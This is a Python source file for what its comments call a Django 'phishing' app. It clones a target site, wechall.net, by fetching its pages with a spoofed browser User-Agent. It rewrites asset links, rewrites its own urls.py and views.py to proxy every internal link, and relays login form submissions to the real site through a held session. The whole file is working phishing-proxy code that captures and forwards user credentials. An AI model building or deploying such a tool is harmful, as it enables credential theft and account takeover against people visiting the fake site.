`1 from django.http import HttpResponse
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin
import requests
import os
import textwrap
from .global_vars import SESSION

# Script to parse html of target website
# For script, img, stylesheet links, add base url to the start
# For all other links found:
# 1. Add url to django phishing/urls.py
# 2. Add function in django phishing/views.py that fetches url from target website and displays content

def parse_html(html, base_url):
    soup = bs(html, "html.parser")

    # Add domain name to script files
    for script in soup.find_all("script"):
        if script.attrs.get("src"):
            # if the tag has the attribute 'src'
            script['src'] = urljoin(base_url, script.attrs.get("src"))

    # Add domain name to stylesheet files
    for css in soup.find_all("link"):
        if css.attrs.get("href"):
            # if the link tag has the 'href' attribute
            css['href'] = urljoin(base_url, css.attrs.get("href"))
    
    # Add domain name to image files
    for img in soup.find_all("img"):
        if img.attrs.get("src"):
            # if the link tag has the 'href' attribute
            img['src'] = urljoin(base_url, img.attrs.get("src"))

    # For all other links
    script_dir = os.path.dirname(__file__)
    for a in soup.find_all("a"):
        if a.attrs.get("href"):
            # Process link
            link = a.attrs.get("href")
            #Ignore external links and non-relevant hrefs
            if link == '/' or link[0] != '/' or any(c in link for c in ['.', '?', '+']):
                continue
            path = link[1:] + '/'
            func_name = path.replace('/', '_').replace('-', '_')[:-1]

            # Add modified link to urlpatterns in urls.py
            # num_lines = sum(1 for line in open(os.path.join(script_dir, "urls.py")))
            with open(os.path.join(script_dir, "urls.py"), "r+") as f:
                lines = f.readlines()
                query = f"path('{path}', views.{func_name}, name='{func_name}'),\n"
                if query not in lines:
                    lines[-1] = query
                    lines.append(']\n')
                    f.seek(0)
                    f.writelines(lines)
                f.close()

            # Create function in views.py
            # TODO: If already exists, don't create
            with open(os.path.join(script_dir, "views.py"), "r+") as f:
                lines = f.readlines()
                query = f"def {func_name}(request):\n"
                if query not in lines:
                    f.write(textwrap.dedent(f'''\
                        def {func_name}(request):
                            url = '{base_url + path[:-1]}'
                            return display_view(url)
                            '''))
                f.close()

            # a['href'] = path[:-1]
    
    return soup

# Function to get content from url and display HTTP response after parsing links
def display_view(url):
    global SESSION
    res = SESSION.get(url)
    html = res.content
    parsed_html = parse_html(html, url)
    # Parse HTML before returning
    return HttpResponse(str(parsed_html))

# Initialize requests session and save cookie dict as global variable
def startup():
    global SESSION, COOKIE_DICT
    # initialize a session
    SESSION = requests.Session()
    # set the User-agent as a regular browser
    SESSION.headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    SESSION.get('https://www.wechall.net/') #Access website to get session cookie

def login_post(url, data):
    global SESSION
    res = SESSION.post(url, data=data)
    # url = 'https://www.wechall.net/welcome'
    # res = SESSION.get(url)
    html = res.content
    parsed_html = parse_html(html, url)
    return HttpResponse(str(parsed_html))

